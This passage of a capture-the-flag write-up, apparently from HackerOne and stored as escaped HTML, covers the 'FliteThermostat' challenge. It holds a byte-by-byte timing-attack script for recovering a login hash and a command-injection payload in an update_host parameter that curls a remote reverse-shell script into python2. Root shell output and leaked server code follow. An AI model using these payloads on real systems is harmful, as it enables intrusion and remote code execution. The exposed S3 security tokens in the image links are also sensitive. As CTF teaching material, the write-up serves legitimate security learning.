class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecands\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n        \u003cspan class=\"n\"\u003enew_thread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edaemon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\n        \u003cspan class=\"n\"\u003enew_thread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n        \u003cspan class=\"n\"\u003enum_threads\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\n        \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"n\"\u003enum_threads\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mf\"\u003e0.1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;[*] Candidates:\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecands\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ecands\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ehack\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eprefix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e64\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;[*] Round start:\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecands\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xff\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecands\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ecands\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edo_round\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecands\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"n\"\u003ecands\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Ran out of candidates!!\u0026#39;\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eprefix\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e%02\u003c/span\u003e\u003cspan class=\"s\"\u003ex\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecands\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e],)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Result: \u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ehack\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# print (\u0026#39;%02x\u0026#39; % val), sum(samples)/len(samples), samples\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt\u0026#39;s pretty obvious that the timing attack worked after I went through all the hashes from \u0026#39;00XXXXX...\u0026#39; to \u0026#39;FFXXXXX...\u0026#39;. Any hash starting with \u0026#39;f9\u0026#39; was noticably slower; the response time was delayed by about 0.5 seconds. Then I tried it for \u0026#39;f900XXXX...\u0026#39; to \u0026#39;f9FFXXXX\u0026#39;, and \u0026#39;f986\u0026#39; was delayed by about 1.0 seconds. I guess we are lucky that the remote server is very consistent with its delays. Unfortunately, the server\u0026#39;s connection is really unstable so we often need multiple tries to make sure that we are sure whether a guess is correct or not.\u003c/p\u003e\n\n\u003cp\u003eAfter a looooooooooooooooooooong time, we finally get the hash \u003ccode\u003ef9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\u003c/code\u003e, which we are able to log in with! It\u0026#39;s kind of like a pass the hash attack, as we don\u0026#39;t even need the plaintext credentials.\u003c/p\u003e\n\n\u003ch3 id=\"0x03-flitethermostat-part-ii\"\u003e0x03 FliteThermostat, part II\u003c/h3\u003e\n\n\u003cp\u003eI used Burp Suite to make the login request, then copied the cookies into Firefox. Now this screen greets us:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"flite1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/486/9ad703f9fd49af597d6fc4cafd909eb77df5d7ee/flite1.png?response-content-disposition=attachment%3B%20filename%3D%22flite1.png%22%3B%20filename%2A%3DUTF-8%27%27flite1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=77cb2bc729eae073c701b54afeb8f155791d47f2ee3976b0b6b5a9dd240965c6\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/486/9ad703f9fd49af597d6fc4cafd909eb77df5d7ee/flite1.png?response-content-disposition=attachment%3B%20filename%3D%22flite1.png%22%3B%20filename%2A%3DUTF-8%27%27flite1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=77cb2bc729eae073c701b54afeb8f155791d47f2ee3976b0b6b5a9dd240965c6\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe temperature control page wasn\u0026#39;t really interesting. One interesting thing I noticed was that it only accepted valid numbers for its API parameter. But you could also use underscores in numbers (e.g. \u003ccode\u003e12_345 = 12345\u003c/code\u003e) which indicated that this was a Python3 Flask server.\u003c/p\u003e\n\n\u003cp\u003eWhat piqued my interest was the Check For Updates page. If we could subvert the firmware update, we could get RCE then!\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"flite3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/487/788ebce60edc0ea6a83f8dadcd10c48210d723af/flite3.png?response-content-disposition=attachment%3B%20filename%3D%22flite3.png%22%3B%20filename%2A%3DUTF-8%27%27flite3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=1add511574f7d88b032ef5e2f6cd37e07e94e82703195aa566b3625e45d85b11\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/487/788ebce60edc0ea6a83f8dadcd10c48210d723af/flite3.png?response-content-disposition=attachment%3B%20filename%3D%22flite3.png%22%3B%20filename%2A%3DUTF-8%27%27flite3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=1add511574f7d88b032ef5e2f6cd37e07e94e82703195aa566b3625e45d85b11\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s see if we can control the host and port for this connection.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update?port=1234\nConnecting to http://update.flitethermostat:1234/ and downloading update manifest\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNice, that one was an easy guess. I tried playing with this parameter, but unfortunately it has to be a valid integer. :( The following parameter, on the other hand, was NOT an easy guess.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update?port=1234\u0026amp;update_host=perfect.blue\nConnecting to http://perfect.blue:1234/ and downloading update manifest\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis told me that this update checker doesn\u0026#39;t actually work: I setup \u003ccode\u003enc -lvp 1234\u003c/code\u003e on that host, but I didn\u0026#39;t receive a connection. In that case, what could we do?\u003c/p\u003e\n\n\u003cp\u003eUnlike before, this parameter isn\u0026#39;t validated. So let\u0026#39;s just try injecting some symbols to see if anything breaks.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update?port=1234\u0026amp;update_host=lol~!@#$%^\u0026amp;*()_+-=[]\\{}|:%22;\u0026#39;%3C%3E?,./\nConnecting to http://lol~!@:1234/ and downloading update manifest\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOK, looks like it cut off the input at \u003ccode\u003e#\u003c/code\u003e. I wonder if this is command injection?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/update?port=1234\u0026amp;update_host=lol;echo a\nConnecting to http://lol and downloading update manifest\n...\n...\n...\nCould not connect\na:1234/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/update?port=1234\u0026amp;update_host=lol$PATH\nConnecting to http://lol/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:1234/ and downloading update manifest\n...\n...\n...\nCould not connect\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYup...so my hypothesis is that the server probably does something like \u003ccode\u003eexec(\u0026quot;check_update http://\u0026quot; + host \u0026quot;:\u0026quot; + str(port)\u0026quot;)\u003c/code\u003e. Let\u0026#39;s upgrade this to a reverse shell and pop this box!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update?port=12345\u0026amp;update_host=x;curl%20https://raw.githubusercontent.com/perfectblue/attack-defense-tools/master/chippyshell.py%20|%20python2;echo%20\n\nOn server:\nroot@perfect.blue:~# socat file:`tty`,raw,echo=0 tcp-listen:6969\n  @@@@@@@ @@@  @@@ @@@ @@@@@@@  @@@@@@@  @@@ @@@  @@@ @@@@@@  @@@@@@  @@@@@@@\n !@@      @@!  @@@ @@! @@!  @@@ @@!  @@@ @@! !@@  @@@     @@!     @@!      @@!\n !@!      @!@!@!@! !!@ @!@@!@!  @!@@!@!   !@!@!   !@!  @!!!:   @!!!:      @!!\n :!!      !!:  !!! !!: !!:      !!:        !!:    !!!     !!:     !!:  .!!:\n  :: :: :  :   : : :    :        :         .:     :   ::: ::  ::: ::  : :\n             ~[  P R I V 8  C O N N E C T   B A C K   S H E L L  ]~\nLinux 834f8ab4b851 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux\nuid=0(root) gid=0(root) groups=0(root)\nroot@d090cd50ec64:~# ip addr\n1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n170: eth0@if171: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:ac:19:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.25.0.3/16 brd 172.25.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\nroot@d090cd50ec64:~# df -h /\nFilesystem      Size  Used Avail Use% Mounted on\noverlay         9.8G  3.2G  6.1G  35% /\ntmpfs            64M     0   64M   0% /dev\ntmpfs           7.4G     0  7.4G   0% /sys/fs/cgroup\n/dev/sda1       9.8G  3.2G  6.1G  35% /etc/hosts\nshm              64M     0   64M   0% /dev/shm\ntmpfs           7.4G     0  7.4G   0% /proc/acpi\ntmpfs           7.4G     0  7.4G   0% /sys/firmware\nroot@d090cd50ec64:~# ls\nDockerfile   login.js  requirements.txt  temptarget  uwsgi.ini\n__pycache__  main.py   templates     update.sh\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNice. A few things to note: based on \u003ccode\u003eip addr\u003c/code\u003e, we\u0026#39;re probably inside Docker. Also, that \u0026quot;\u0026quot;\u0026quot;update checker\u0026quot;\u0026quot;\u0026quot; was a total scam:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Connecting to \u003c/span\u003e\u003cspan class=\"nv\"\u003e$*\u003c/span\u003e\u003cspan class=\"s2\"\u003e and downloading update manifest\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;...\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;...\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;...\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Could not connect\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd the earlier hypothesis about the timing attack was pretty close!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003evalidLogin\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emethods\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;loggedIn\u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;loggedIn\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eredirect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/main\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    